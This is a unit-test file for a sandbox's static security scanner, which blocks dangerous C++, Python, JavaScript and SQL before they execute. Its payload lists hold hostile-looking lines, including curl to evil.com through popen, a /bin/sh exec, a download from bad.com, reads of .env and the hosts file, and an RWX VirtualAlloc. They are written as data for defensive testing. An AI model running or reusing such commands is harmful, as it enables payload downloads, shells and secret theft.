import os
import sys
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from secure_scan import (
    SECURITY_PATTERNS,
    compute_code_quality_metrics,
    run_security_guardrail,
    scan_all_security_issues,
    get_security_summary,
)
from compiler_service import compile_and_run


class TestSecurityScannerPreExecution(unittest.TestCase):
    """
    Validates that dangerous or malicious C++ code is identified and blocked
    at the static pre-execution layer without ever executing on the host PC.
    """

    def test_benign_code_allowed(self):
        code = """
        #include <iostream>
        #include <vector>
        #include <string>
        using namespace std;

        int main() {
            vector<string> items = {"apple", "banana"};
            for (const auto& item : items) {
                cout << item << endl;
            }
            return 0;
        }
        """
        is_safe, warning = run_security_guardrail(code)
        self.assertTrue(is_safe)
        self.assertEqual(warning, "Code looks safe.")
        summary = get_security_summary(code)
        self.assertTrue(summary["is_safe"])
        self.assertEqual(summary["risk_level"], "CLEAN")

    def test_blocks_os_command_execution(self):
        payloads = [
            'int main() { system("shutdown /s /t 0"); return 0; }',
            'int main() { popen("curl http://evil.com/payload", "r"); return 0; }',
            'int main() { execl("/bin/sh", "sh", NULL); return 0; }',
            'int main() { fork(); return 0; }',
            'int main() { WinExec("calc.exe", 1); return 0; }',
            'int main() { CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL); return 0; }',
            'int main() { ShellExecute(NULL, "open", "powershell", NULL, NULL, 0); return 0; }',
            'const { execSync } = require("node:child_process"); execSync("whoami");',
            'const net = await fetch("http://example.test");',
            'const result = new Function("return process")();',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Payload should be blocked: {payload}")
            self.assertIn("CRITICAL:", warning)

    def test_blocks_network_exfiltration(self):
        payloads = [
            '#include <winsock2.h>\nint main() { return 0; }',
            '#include <sys/socket.h>\nint main() { return 0; }',
            'int main() { WSAStartup(0, NULL); return 0; }',
            'int main() { int s = socket(2, 1, 0); return 0; }',
            'int main() { URLDownloadToFileA(NULL, "http://bad.com", "out.exe", 0, NULL); return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Network payload should be blocked: {payload}")

    def test_blocks_filesystem_tampering(self):
        payloads = [
            'int main() { DeleteFileA("C:\\\\important.txt"); return 0; }',
            'int main() { remove("data.db"); return 0; }',
            'int main() { unlink("config.json"); return 0; }',
            '#include <fstream>\nint main() { std::ifstream f("../../../.env"); return 0; }',
            '#include <fstream>\nint main() { std::ifstream f("C:/Windows/System32/drivers/etc/hosts"); return 0; }',
            '#include <CON>\nint main() { return 0; }',
            '#include __FILE__\nint main() { return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Filesystem payload should be blocked: {payload}")

    def test_blocks_dynamic_loading_and_shellcode(self):
        payloads = [
            'int main() { LoadLibraryA("user32.dll"); return 0; }',
            'int main() { dlopen("lib.so", 1); return 0; }',
            'int main() { __asm__("nop"); return 0; }',
            'int main() { VirtualAlloc(NULL, 1024, 0x1000, 0x40); return 0; }',
            'int main() { mprotect(NULL, 4096, 7); return 0; }',
        ]
        for payload in payloads:
            is_safe, warning = run_security_guardrail(payload)
            self.assertFalse(is_safe, f"Dynamic/Shellcode payload should be blocked: {payload}")

    def test_blocks_macro_aliasing_evasion(self):
        payload = """
        #define RUN system
        int main() {
            RUN("calc.exe");
            return 0;
        }
        """
        is_safe, warning = run_security_guardrail(payload)
        self.assertFalse(is_safe)
        self.assertIn("CRITICAL:", warning)

    def test_compiler_service_defense_in_depth(self):
        """
        Verify compiler_service.compile_and_run intercepts malicious code
        even if called directly outside app.py.
        """
        malicious_code = 'int main() { system("echo hacked"); return 0; }'
        result = compile_and_run(malicious_code)
        self.assertEqual(result.status_code, 1)
        self.assertIn("SECURITY GUARDRAIL BLOCKED", result.stderr)

    def test_python_os_command_is_blocked_before_execution(self):
        source = "import os\nos.system('echo unsafe')\n"
        result = compile_and_run(source, language="python")
        self.assertEqual(result.status_code, 1)
        self.assertIn("SECURITY GUARDRAIL BLOCKED", result.stderr)

    def test_javascript_child_process_is_blocked_before_execution(self):
        source = 'require("child_process").execSync("whoami");'
        result = compile_and_run(source, language="javascript")
        self.assertEqual(result.status_code, 1)
        self.assertIn("SECURITY GUARDRAIL BLOCKED", result.stderr)

    def test_missing_gpp_fails_gracefully(self):
        with patch("compiler_service.shutil.which", return_value=None):
            result = compile_and_run("int main() { return 0; }")
        self.assertEqual(result.status_code, 1)
        self.assertIn("g++", result.stderr)

    def test_lldb_execution_is_disabled(self):
        from lldb_engine import agentic_debug_loop

        diagnosis, log = agentic_debug_loop("source", "runtime error")

        self.assertIn("disabled", diagnosis)
        self.assertEqual(log, "")

    def test_sql_attach_is_denied(self):
        result = compile_and_run(
            "ATTACH DATABASE '/tmp/untrusted.db' AS untrusted;",
            language="sql",
        )
        self.assertEqual(result.status_code, 1)
        self.assertIn("not authorized", result.stderr.lower())

    def test_sql_query_uses_the_in_memory_fixture(self):
        result = compile_and_run(
            "SELECT name FROM students ORDER BY id;",
            language="sql",
        )
        self.assertEqual(result.status_code, 0)
        self.assertIn("Arpit", result.stdout)
        self.assertIn("Rohan", result.stdout)
    def test_advisory_vulnerabilities_do_not_block_compilation(self):
        """
        Verify that advisory vulnerabilities (like strcpy, gets, sprintf) do not block
        pre-execution compilation, but are still captured in static diagnostic reports.
        """
        code = 'int main() { char buf[10]; strcpy(buf, "hi"); return 0; }'
        is_safe, warning = run_security_guardrail(code)
        self.assertTrue(is_safe, "Advisory vulnerabilities should allow compilation for benchmarking/debugging")
        issues = scan_all_security_issues(code)
        self.assertTrue(any("strcpy" in issue["message"] for issue in issues), "Advisory vulnerabilities must still be reported in diagnostics")

    def test_quality_percentages_count_configured_checks(self):
        clean_code = "int main() { return 0; }"
        clean_metrics = compute_code_quality_metrics(clean_code, language="cpp")
        self.assertEqual(clean_metrics["security_score"], 100.0)
        self.assertEqual(clean_metrics["security_checks_total"], len(SECURITY_PATTERNS))
        self.assertEqual(clean_metrics["efficiency_score"], 100.0)
        self.assertEqual(clean_metrics["efficiency_checks_total"], 7)
        self.assertEqual(clean_metrics["score_basis"], "configured_static_checks")

        flagged_metrics = compute_code_quality_metrics(
            'int main() { char dst[8]; strcpy(dst, "value"); return 0; }',
            language="cpp",
        )
        self.assertEqual(flagged_metrics["security_checks_flagged"], 1)
        self.assertEqual(flagged_metrics["security_risk_weight"], 35.0)
        self.assertEqual(
            flagged_metrics["security_score"],
            round(100.0 * (len(SECURITY_PATTERNS) - 1) / len(SECURITY_PATTERNS), 1),
        )

    def test_non_cpp_languages_do_not_get_cpp_efficiency_findings(self):
        metrics = compute_code_quality_metrics(
            "for (let i = 0; i < items.length; i++) { console.log(items[i]); }",
            language="javascript",
        )
        self.assertEqual(metrics["efficiency_checks_total"], 1)
        self.assertEqual(metrics["efficiency_checks_flagged"], 0)
        self.assertEqual(metrics["efficiency_score"], 100.0)

    def test_efficiency_percentage_counts_flagged_rules(self):
        source = """
        #include <iostream>
        int main() {
            for (int i = 0; i < 10; ++i) {
                std::cout << i << std::endl;
            }
        }
        """
        metrics = compute_code_quality_metrics(source, language="cpp")
        self.assertEqual(metrics["efficiency_checks_flagged"], 1)
        self.assertEqual(metrics["efficiency_score"], round(100.0 * 6 / 7, 1))


if __name__ == "__main__":
    unittest.main()
